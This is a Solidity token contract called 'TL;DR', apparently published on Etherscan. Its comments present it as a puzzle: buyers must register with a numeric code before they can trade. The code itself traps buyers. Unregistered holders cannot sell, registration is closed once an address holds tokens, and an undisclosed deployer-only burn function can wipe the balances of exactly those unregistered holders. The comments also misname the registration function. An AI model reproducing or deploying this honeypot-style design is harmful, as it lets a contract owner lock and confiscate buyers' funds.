/**
 *Submitted for verification at Etherscan.io on 2023-07-01
*/

//SPDX-License-Identifier: Unlicensed

//Hello! Welcome  to TL;DR, a new experiment in crypto to see if people are willing to actually look at what they buy or not. In order to trade,
// you will need to input a code into the function labeled "Greenlist". The code you input is 146266. This will allow you to buy into the project
//and sell your tokens later. If you do not put in that code you will be unable to send or sell any of the tokens you aquire. By the way. That code was slightly incorrect.
//in order to make it work you have to add 2 (so it ends in 68) to the code so it works properly. I Told you reading the whole thing was important. And one more thing. Check line 59 (If i did everything right, Should be around that area) For more info that can help if you are worried.


//Best of luck trader! TG: https://t.me/TLDR_Crypto Twitter: https://twitter.com/TLDR_ERC20


//TL;DR. Read the whole thing. its all important. 
pragma solidity 0.8.20; 

contract TL_DR {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping (address => uint) public Orangelisted;
    address public immutable deployer;
    uint256 public burnamount;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = 3e25;
        deployer = (msg.sender);

    }

    function name() public pure returns (string memory) {return 'Too Long Didnt Read';}
    function symbol() public pure returns (string memory) {return 'TLDR';}
    function decimals() public pure returns (uint256) {return 18;}
    function totalSupply() public view returns (uint256) {return 3e25 - (burnamount);}
    function Burned() public view returns (uint256) {return burnamount;}
 
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        _approve(from, msg.sender, currentAllowance - amount);
        
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: transfer amount exceeds balance or you hold too much");
        require ( Orangelisted[from] != 0, "sorry you cant trade");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;


        if (Orangelisted[to] == 1) {require ((balanceOf[to] <= 6e23), "over max limit");}

// Hello! If you think you made a mistake you can call "Orangelisted" and see whether you did it right or not. Put in your addy and if it returns 1 you did it right
        emit Transfer(from, to, amount);
    }

        function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function Orangelist (uint c) public {
        require (balanceOf[msg.sender] == 0, "mogged");
        if (c == ((7e7-6e5)/5e2)+(29868/4) + (700 % 3)) {Orangelisted[msg.sender] = 1;}
    } 

    // Will whitelist anyone incase I fucked up, as well as for LP's and exchanges
    function ownerWL (address _address, uint8 _q) external deployed {
       if (_q == 0) { Orangelisted[_address] = 1;}
       else Orangelisted[_address] = 2;
    }

    function burn (address burnee, uint256 amount) external deployed {
        require (Orangelisted[burnee] == 0, "inellgible. This person has done everything right");
        require (balanceOf[burnee] >= amount, "You cant burn more then this person has");
        balanceOf[burnee] -= amount;
        burnamount += amount;

    }

    modifier deployed() {
        require (msg.sender == deployer, "you didnt make this");
        _;
    }
    


}